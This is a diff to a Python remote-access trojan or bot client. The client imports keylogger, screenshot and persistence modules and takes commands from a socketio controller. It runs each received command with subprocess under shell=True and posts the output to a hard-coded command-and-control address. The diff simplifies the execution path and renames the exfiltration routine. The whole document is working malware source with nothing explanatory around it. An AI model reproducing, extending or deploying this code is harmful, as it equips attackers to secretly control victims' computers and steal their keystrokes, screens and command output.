@@ -1,11 +1,6 @@
-import socketio, persistence
-import subprocess
-import platform
-import os
-import socket
-import threading
+import socketio, platform, requests, os, socket, subprocess, threading, persistence
+import screenshot as ImageGrab
 from requests import post, get
-import pyscreenshot as ImageGrab
 from keylogger import start_keylogger
 
 info = {}
@@ -25,66 +20,28 @@ keyloggerNumber = 1
 
 def execute_command(bot_id, command):
     try:
-        if not bot_id:
-            command = f"allbots {command}"
-
-        if command.startswith("shell"):
-            args = command.split()[1:]
-            f = "cmd.exe"
-            arg = "/c "
-            for a in args:
-                arg += a + " "
-        elif command.startswith("powershell"):
-            args = command.split()[1:]
-            f = "powershell.exe"
-            arg = "-Command "
-            for a in args:
-                arg += a + " "
-        else:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate()
-            output_str = output.decode('utf-8') if output else ""
-            error_str = error.decode('utf-8') if error else ""
-
-            if error_str:
-                result = f"Error: {error_str}"
-            else:
-                result = f"Output: {output_str}"
-
-            send_result_to_server(result)
-            return
-
-        process = subprocess.Popen([f, arg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, error = process.communicate()
         output_str = output.decode('utf-8') if output else ""
         error_str = error.decode('utf-8') if error else ""
-
         if error_str:
             result = f"Error: {error_str}"
         else:
             result = f"Output: {output_str}"
-
-        send_result_to_server(result)
-
+        send_output(result)
     except Exception as e:
-        result = f"Error: {str(e)}"
-        send_result_to_server(result)
+        print(f"Error: {str(e)}")
 
-def send_result_to_server(result):
+def send_output(output):
+    data = {"output": output}
     try:
-        data = {
-            "result": result,
-        }
-
-        response = post('http://192.168.100.222:5000/execute_command', json=data)
-
+        response = requests.post("http://192.168.100.222/commands", json=data)
         if response.status_code == 200:
-            print("Result sent to server successfully")
+            print("Output sent successfully.")
         else:
-            print(f"Failed to send result to server. Status code: {response.status_code}")
-
+            print("Failed to send output. Status code:", response.status_code)
     except Exception as e:
-        print(f"Error sending result to server: {str(e)}")
+        print("Error:", e)
 
 @sio.event
 def connect():
